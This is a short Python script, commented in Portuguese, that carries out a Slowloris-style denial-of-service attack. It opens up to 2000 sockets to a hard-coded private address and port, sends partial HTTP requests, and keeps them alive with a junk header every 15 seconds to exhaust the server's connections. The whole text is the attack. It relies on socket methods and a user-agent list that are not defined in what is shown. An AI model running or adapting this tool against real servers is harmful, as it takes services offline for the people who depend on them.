def iniciar_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))
    s.enviar_requisicao(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
    ua = user_agents[0]
    s.enviar_cabelhaco("User-Agent", ua)
    s.enviar_cabelhaco("Accept-language", "en-US,en,q=0.5")
    return s


def main():
    ip = "172.21.210.74"
    port = 2000
    quantidade_socket = 2000
    lista_de_sockets = []    

    print("Criando sockets")
    for i in range(quantidade_socket):
        try:
            socket = iniciar_socket(ip, port)
        except:
            break
        lista_de_sockets.append(socket)

    while True:
        try:
            print("Enviando keep-alive")            
            for socket in list(lista_de_sockets):
                try:
                    socket.enviar_cabelhaco("X-a", random.randint(1, 5000))
                except:
                    lista_de_sockets.remove(socket)

            time.sleep(15)

        except:
            print("Erro ao enviar requisições!")
            break

if __name__ == "__main__":
    main()